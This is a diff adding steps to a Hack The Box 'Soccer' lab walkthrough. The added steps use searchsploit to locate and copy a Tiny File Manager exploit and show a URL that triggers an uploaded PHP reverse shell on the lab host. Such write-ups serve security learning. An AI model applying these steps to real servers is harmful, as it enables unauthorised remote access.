@@ -42,3 +42,19 @@ http://soccer.htb/tiny/tinyfilemanager.php?p=tiny&view=tinyfilemanager.php
 
 ![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/e6bf6ffd-563e-4d6c-aeaa-6383c9f3f05c)
 
+```
+searchsploit 'tiny file manager'
+```
+
+```
+searchsploit -m 50828
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/100bfbb8-c7b7-4450-829c-3431857e1a6d)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/7f70c8e8-edd9-4b4e-ab03-6221c00dc211)
+
+http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads&view=php-reverse-shell.php
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/110f739d-2947-462e-b5fc-bff884d68fda)
+
